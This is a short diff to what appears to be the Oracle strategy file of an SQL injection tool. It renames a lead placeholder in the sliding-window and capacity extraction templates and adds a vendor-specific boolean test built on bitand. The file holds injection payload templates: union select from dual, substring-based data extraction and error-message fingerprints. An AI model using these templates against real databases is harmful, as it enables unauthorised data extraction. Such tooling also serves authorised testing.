@@ -173,7 +173,7 @@ strategy:
   slidingWindow: |
    (
        select
-           '${lead}'
+           '${lead_pipe}'
            || substr(
                (${injection}),
                ${window.char},
@@ -209,13 +209,14 @@ strategy:
     - "Warning: oci_fetch_array()"
    orderByErrorMessage:
     - ORDER BY item must be the number of a SELECT-list expression
+   vendorSpecific: 0 != bitand(case when ${test} then 1 else 2 end, 1)
 
  normal:
   indices: union select ${indices} from dual
   capacity: |
    (
        select
-           '${lead}'
+           '${lead_pipe}'
            || ${indice}
            || ${calibrator}
            s
